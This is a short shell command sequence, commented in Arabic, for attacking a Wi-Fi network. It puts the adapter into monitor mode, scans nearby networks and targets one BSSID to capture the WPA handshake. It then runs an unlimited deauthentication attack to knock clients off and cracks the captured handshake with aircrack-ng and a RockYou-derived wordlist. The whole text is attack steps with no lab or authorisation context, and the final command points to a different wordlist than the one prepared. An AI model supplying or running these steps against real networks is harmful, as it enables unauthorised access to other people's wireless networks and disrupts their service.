# تفعيل وضع المراقبة وتنظيف العمليات المتعارضة
sudo airmon-ng check kill
sudo airmon-ng start wlan0

# مراقبة الشبكات المحيطة
sudo airodump-ng wlan0mon

# استهداف شبكة معينة لالتقاط الهاندشيك
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w hack_output wlan0mon

# هجوم الفصل (Deauth Attack) لإجبار الأجهزة على إعادة الاتصال
sudo aireplay-ng --deauth 0 -a [BSSID] wlan0mon
# فك ضغط قائمة RockYou الشهيرة
sudo gunzip /usr/share/wordlists/rockyou.txt.gz

# نسخ القائمة لسطح المكتب لسهولة الوصول
cp /usr/share/wordlists/rockyou.txt ~/Desktop/

# تنفيذ أمر كسر التشفير باستخدام القائمة المخصصة
aircrack-ng -w ~/Desktop/mypass.txt ~/Desktop/handshake_file.cap
